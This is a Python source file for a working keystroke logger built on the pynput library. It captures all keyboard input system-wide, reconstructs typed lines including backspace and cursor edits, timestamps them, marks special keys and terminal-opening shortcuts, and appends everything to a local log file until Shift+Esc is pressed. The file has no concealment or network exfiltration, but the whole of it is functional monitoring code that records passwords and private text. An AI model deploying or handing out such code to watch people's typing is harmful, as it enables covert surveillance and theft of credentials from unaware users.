# Libraries

import platform
import datetime
from pynput.keyboard import Key, KeyCode, Listener


# main program

keys_file = "keylog.txt"
buffer = []
keys_set = set()

FLUSH_THRESHOLD = 30                                                # flush to file every 30 characters
cursor_pos = 0
start_program = False
caps_pressed = False
ctrl_pressed = False
alt_pressed = False
shift_pressed = False
esc_pressed = False


# --- Listener: on_press ---
def on_press(key):
    global buffer, caps_pressed, shift_pressed, esc_pressed, ctrl_pressed, alt_pressed, cursor_pos
    threshold_reached = False
    
    try:
        if isinstance(key, KeyCode) and key.char is not None:                                    # represents printable characters
            key = key.char
            
            if key == "t" and ctrl_pressed and alt_pressed:                                      # when used with modifiers / combo keys, e.g. CTRL + ALT + T, Windows treats T as key.vk = 84 while Linux treats it as 't'           
                write_file(list("\n[OPENED COMMAND PROMPT]"), False)
            elif not ctrl_pressed:
                if caps_pressed or shift_pressed:
                    buffer.insert(cursor_pos, key.upper())
                else:
                    buffer.insert(cursor_pos, key.lower())
                cursor_pos += 1                                                                 # increment the cursor if we insert something new (w/ key.left, key.right, key.delete, key.backspace)

        elif isinstance(key, Key):                                                              # represents special keys
            
                match key:
                    case Key.enter:
                        line_to_write = buffer[:cursor_pos]                                     # current line
                        buffer = buffer[cursor_pos:]                                            # keep rest in buffer
                        cursor_pos = 0
                        write_file(line_to_write, False)

                    case Key.caps_lock:
                        caps_pressed = not caps_pressed

                    case Key.space:
                        buffer.insert(cursor_pos, " ")
                        cursor_pos += 1

                    case Key.backspace:
                        if cursor_pos > 0:
                            buffer.pop(cursor_pos - 1)
                            cursor_pos -= 1

                    case Key.tab:
                        spaces = " " * 4                                                        # set to 4 spaces
                        for space in spaces:
                            buffer.insert(cursor_pos, space)
                            cursor_pos += 1

                    case Key.shift | Key.shift_r | Key.shift_l:
                        shift_pressed = True
                        keys_set.add(key)

                    case Key.ctrl | Key.ctrl_r | Key.ctrl_l:
                        ctrl_pressed = True
                        keys_set.add(key)

                    case Key.alt | Key.alt_l | Key.alt_r:
                        alt_pressed = True
                        keys_set.add(key)

                    case Key.esc:
                        esc_pressed = True
                        keys_set.add(key)

                    case Key.left:
                        if cursor_pos > 0:
                            cursor_pos -= 1
                        write_file([f"[←]"], False)

                    case Key.right:
                        if cursor_pos < len(buffer):
                            cursor_pos += 1
                        write_file([f"[→]"], False)
                    
                    case Key.up:
                        write_file([f"[↑]"], False)

                    case Key.down:
                        write_file([f"[↓]"], False)

                    case Key.f1 | Key.f2 | Key.f3 | Key.f4 | Key.f5 | Key.f6 | \
                        Key.f7 | Key.f8 | Key.f9 | Key.f10 | Key.f11 | Key.f12:
                        write_file([f"[{str(key).replace('Key.', '').upper()}]"], False)

                    case Key.delete:
                        if cursor_pos < len(buffer):
                            buffer.pop(cursor_pos)
                        

                if len(buffer) >= FLUSH_THRESHOLD:
                    threshold_reached = True
                    write_file(buffer, threshold_reached)
                    cursor_pos = 0

                if any(k in keys_set for k in (Key.shift, Key.shift_r, Key.shift_l)) and Key.esc in keys_set:
                    write_file(buffer, False)                                               # before ending, we write the buffer to the file
                    write_file(list(f"\n[SESSION END]"), False)                             # write 'SESSION END' to the file
                    
                    return False                                                            # end program


    except AttributeError:
        write_file(list("AttributeError: Unable to process key event due to missing or invalid attribute."), False)
    except Exception as e:
        error_type = type(e).__name__
        write_file(list(f"Unknown error occurred: {error_type} - {e}"), False)



# --- Listener: on_release ---
def on_release(key):
    global shift_pressed, esc_pressed, ctrl_pressed, alt_pressed

    match(key):
        case Key.shift | Key.shift_r | Key.shift_l:
            shift_pressed = False
            keys_set.discard(key)
        case Key.esc:
            esc_pressed  = False
            keys_set.discard(key)
        case Key.ctrl | Key.ctrl_r | Key.ctrl_l:
            ctrl_pressed = False
            keys_set.discard(key)
        case Key.alt | Key.alt_l | Key.alt_r:
            alt_pressed = False
            keys_set.discard(key)



# --- File writer ---
def write_file(buffer, threshold_reached):
    try:
        with open(keys_file, "a", encoding="utf-8") as file:
            output = ''.join(buffer)                                                # join as string not list
            if not threshold_reached:
                output = f"{output:<50}{datetime.datetime.now()}\n"
            file.write(output)
            file.flush()                                                            # force it to write to disk immediately
            buffer.clear()                                                          # clear buffer

    except Exception as error:
        with open(keys_file, "a", encoding="utf-8") as file:
            file.write(f"Error writing to file: {error}")
            file.flush()



# if either the on_press or on_release function returns False, it will immediately stop the listener and exit the listener.join() block
with Listener(on_press=on_press, on_release=on_release) as keyboardListener:
    if not start_program:
        startlist = list(f"Operating System: {platform.system()}\n[SESSION START]")
        write_file(startlist, False)
        start_program = True
    keyboardListener.join()                                                         # blocking code



# Note:
#   1. In windows, when a key doesn't produce a visible character (like many shortcut keys or dead keys), key.char is None. This happens during combinations like:
#       - Ctrl + Alt + T (opens terminal in Linux)

#   2. In Windows, when using key combinations (e.g., Ctrl+Alt+T), pynput often cannot resolve the printable character (key.char) because the key is modified and interpreted as a system command.